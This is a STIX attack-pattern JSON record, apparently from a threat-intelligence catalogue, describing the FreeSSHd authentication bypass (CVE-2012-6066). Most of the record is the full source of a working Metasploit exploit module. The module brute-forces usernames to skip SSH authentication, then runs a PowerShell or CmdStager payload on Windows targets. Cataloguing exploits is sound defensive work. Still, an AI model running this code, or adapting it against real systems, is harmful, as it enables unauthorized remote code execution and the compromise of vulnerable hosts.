{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7db7cace-07ea-40d1-846b-4143e271998e",
    "created": "2024-08-14T16:47:57.718031Z",
    "modified": "2024-08-14T16:47:57.718036Z",
    "name": "\"Freesshd Authentication Bypass\"",
    "description": " This module exploits a vulnerability found in FreeSSHd <= 1.2.6 to bypass authentication. You just need the username (which defaults to root). The exploit has been tested with both password and public key authentication.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ssh/freesshd_authbypass.rb",
            "external_id": "freesshd_authbypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-6066"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/fulldisclosure/2012-12/0012.html"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2010/Aug/132"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => \"Freesshd Authentication Bypass\",\n        'Description'    => %q{\n          This module exploits a vulnerability found in FreeSSHd <= 1.2.6 to bypass\n          authentication. You just need the username (which defaults to root). The exploit\n          has been tested with both password and public key authentication.\n        },\n        'License'        => MSF_LICENSE,\n        'Author'         =>\n          [\n            'Aris', # Vulnerability discovery and Exploit\n            'kcope', # 2012 Exploit\n            'Daniele Martini <cyrax[at]pkcrew.org>', # Metasploit module\n            'Imran E. Dawoodjee <imrandawoodjee[at]infosec@gmail.com> (minor improvements)' # minor improvements\n          ],\n        'References'     =>\n          [\n            ['CVE', '2012-6066'],\n            ['OSVDB', '88006'],\n            ['BID', '56785'],\n            ['URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2012-12/0012.html'],\n            ['URL', 'https://seclists.org/fulldisclosure/2010/Aug/132']\n          ],\n        'Platform'       => 'win',\n        'Privileged'     => true,\n        'Targets'        =>\n          [\n            ['PowerShell', {}],\n            ['CmdStager upload', {}]\n          ],\n        'DefaultTarget'  => 0,\n        'DisclosureDate' => '2010-08-11'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(22),\n        OptString.new('USERNAME', [false, 'A specific username to try']),\n        OptPath.new(\n          'USER_FILE',\n          [\n            true,\n            \"File containing usernames, one per line\",\n            # Defaults to unix_users.txt, because this is the closest one we can try\n            File.join(Msf::Config.data_directory, \"wordlists\", \"unix_users.txt\")\n          ]\n        )\n      ]\n    )\n  end\n\n  def check\n    connect\n    banner = sock.recv(30)\n    disconnect\n    if banner.match?(/SSH\\-2\\.0\\-WeOnlyDo/)\n      version = banner.split(\" \")[1]\n      return Exploit::CheckCode::Vulnerable if version.match?(/(2\\.1\\.3|2\\.0\\.6)/)\n\n      return Exploit::CheckCode::Detected\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def execute_command(cmd, _opts = {})\n    @connection.exec!(\"cmd.exe /c \" + cmd)\n  end\n\n  def setup_ssh_options\n    {\n      password:        rand_text_alpha(8),\n      port:            datastore['RPORT'],\n      timeout:         1,\n      proxies:         datastore['Proxies'],\n      key_data:        OpenSSL::PKey::RSA.new(2048).to_pem,\n      auth_methods:    ['publickey'],\n      verify_host_key: :never\n    }\n  end\n\n  def do_login(username, options)\n    print_status(\"Trying username '#{username}'\")\n    options[:username] = username\n\n    transport = Net::SSH::Transport::Session.new(datastore['RHOST'], options)\n    auth = Net::SSH::Authentication::Session.new(transport, options)\n    auth.authenticate(\"ssh-connection\", username, options[:password])\n    connection = Net::SSH::Connection::Session.new(transport, options)\n    begin\n      Timeout.timeout(10) do\n        connection.exec!('cmd.exe /c echo')\n      end\n    rescue Timeout::Error\n      print_status(\"Timeout\")\n      return nil\n    rescue RuntimeError\n      return nil\n    end\n    connection\n  end\n\n  #\n  # Cannot use the auth_brute mixin, because if we do, a payload handler won't start.\n  # So we have to write our own each_user here.\n  #\n  def each_user\n    user_list = []\n    if datastore['USERNAME'] && !datastore['USERNAME'].empty?\n      user_list << datastore['USERNAME']\n    else\n      f = File.open(datastore['USER_FILE'], 'rb')\n      buf = f.read\n      f.close\n\n      user_list = (user_list | buf.split).uniq\n    end\n\n    user_list.each do |user|\n      yield user\n    end\n  end\n\n  def exploit\n    unless [CheckCode::Vulnerable].include? check\n      fail_with Failure::NotVulnerable, 'Target is most likely not vulnerable!'\n    end\n\n    options = setup_ssh_options\n\n    @connection = nil\n\n    each_user do |username|\n      next if username.empty?\n\n      @connection = do_login(username, options)\n      break if @connection\n    end\n\n    if @connection\n      case target.name\n      when 'PowerShell'\n        print_status('Executing payload via Powershell...')\n        psh_command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)\n        @connection.exec!(\"cmd.exe /c \" + psh_command)\n      when 'CmdStager upload'\n        print_status(\"Uploading payload, this may take several minutes...\")\n        execute_cmdstager(flavor: :vbs, decoder: default_decoder(:vbs), linemax: 1700)\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-08-11",
    "x_mitre_platforms": [
        "win'"
    ]
}